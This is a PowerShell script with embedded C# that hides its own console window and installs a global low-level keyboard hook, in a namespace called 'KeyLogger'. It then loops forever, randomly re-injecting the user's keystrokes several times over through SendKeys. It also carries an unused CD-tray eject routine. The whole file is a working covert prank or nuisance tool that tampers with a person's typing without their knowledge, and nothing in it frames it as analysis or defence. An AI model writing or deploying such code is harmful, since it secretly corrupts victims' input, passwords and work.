Add-Type -TypeDefinition  @'
using System;
using System.Runtime.InteropServices;
using System.ComponentModel;
 
namespace CDROM
{
    public class Commands
    {
        [DllImport("winmm.dll")]
        static extern Int32 mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);
 
        public static void Eject()
        {
             string rt = "";
             mciSendString("set CDAudio door open", rt, 127, IntPtr.Zero);
        }
 
        public static void Close()
        {
             string rt = "";
             mciSendString("set CDAudio door closed", rt, 127, IntPtr.Zero);
        }
    }
}
'@

Add-Type -TypeDefinition '
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger {
  public static class Program {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private static HookProc hookProc = HookCallback;
    private static IntPtr hookId = IntPtr.Zero;
    private static int keyCode = 0;

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static int WaitForKey() {
      hookId = SetHook(hookProc);
      Application.Run();
      UnhookWindowsHookEx(hookId);
      return keyCode;
    }

    private static IntPtr SetHook(HookProc hookProc) {
      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
    }

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
        keyCode = Marshal.ReadInt32(lParam);
        Application.Exit();
      }
      return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
  }
}
' -ReferencedAssemblies System.Windows.Forms

Add-Type -Name Window -Namespace Console -MemberDefinition '

[DllImport("Kernel32.dll")]

public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]

public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);

'

function Show-Console {

  $consolePtr = [Console.Window]::GetConsoleWindow()

 #5 show

[Console.Window]::ShowWindow($consolePtr, 5)

}

function Hide-Console {

   $consolePtr = [Console.Window]::GetConsoleWindow()

 #0 hide

[Console.Window]::ShowWindow($consolePtr, 0)

}

Hide-Console

while ($true) {
    $key = [System.Windows.Forms.Keys][KeyLogger.Program]::WaitForKey()
	$randomValue = Get-Random -Minimum 1 -Maximum 10
	$randomValueWillHappen = Get-Random -Minimum 0 -Maximum 25
	
    if ($randomValueWillHappen -eq 1) {
		for($i = 0; $i -lt $randomValue; $i++) {
			[System.Windows.Forms.SendKeys]::SendWait($key)
		}
		
    }
}